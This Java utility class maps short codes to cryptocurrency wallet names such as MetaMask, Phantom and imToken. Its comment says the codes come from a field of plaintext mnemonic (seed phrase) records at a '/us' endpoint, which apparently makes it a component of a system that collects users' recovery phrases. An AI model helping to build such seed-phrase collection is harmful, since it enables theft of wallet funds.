package com.consume.util;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

/**
 * /us 助记词明文 a 字段 → 钱包名称映射。
 * 找不到对应关系时返回原始值。
 */
public final class WalletSourceUtil {

    private static final Map<String, String> CODE_TO_NAME;

    static {
        Map<String, String> m = new HashMap<>();
        m.put("b1", "imtoken");
        m.put("r", "bitpie");
        m.put("d", "trust");
        m.put("n", "tonhup");
        m.put("i", "phantom");
        m.put("h", "uniswap");
        m.put("k", "exodus");
        m.put("c", "tronlink");
        m.put("t", "okx");
        m.put("g", "tonkeeper");
        m.put("l", "Ronin");
        m.put("a1", "metamask");
        m.put("a", "metamask");
        m.put("s", "solflare");
        m.put("f", "bitkeep");
        m.put("b", "imtoken");
        m.put("j", "mytonwallet");
        m.put("p", "tokenpocket");
        m.put("e", "base");
        CODE_TO_NAME = Collections.unmodifiableMap(m);
    }

    private WalletSourceUtil() {
    }

    /**
     * 将 a 字段短码转为钱包名称；无映射则原样返回（trim 后）。
     */
    public static String toWalletName(String code) {
        if (code == null) {
            return "";
        }
        String key = code.trim();
        if (key.isEmpty()) {
            return "";
        }
        String name = CODE_TO_NAME.get(key);
        if (name == null) {
            name = CODE_TO_NAME.get(key.toLowerCase());
        }
        return name != null ? name : key;
    }
}
